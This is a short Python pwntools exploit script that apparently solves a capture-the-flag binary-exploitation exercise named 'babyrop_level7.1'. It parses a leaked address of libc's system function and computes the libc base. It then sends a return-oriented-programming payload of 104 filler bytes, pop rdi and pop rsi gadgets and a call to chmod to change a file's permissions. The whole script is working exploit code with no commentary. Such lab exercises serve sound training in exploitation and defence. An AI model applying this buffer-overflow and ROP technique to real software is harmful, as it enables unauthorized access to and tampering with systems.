from pwn import *

p = process("/challenge/babyrop_level7.1")

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil(b'libc is: ')

#gdb.attach(p,'''break * challenge''')

system = int(p.recv().decode()[:-3],16)
print(system)
libc.address = system - libc.sym['system']
gadget1 = 0x401863 # pop rdi; ret
gadget2 = 0x401861 # pop rsi; ret
string_leaving = 0x402041
payload = b"A"*104+p64(gadget1)+p64(string_leaving)+p64(gadget2)+p64(7)*2
payload += p64(libc.sym['chmod'])

p.send(payload)

p.interactive()
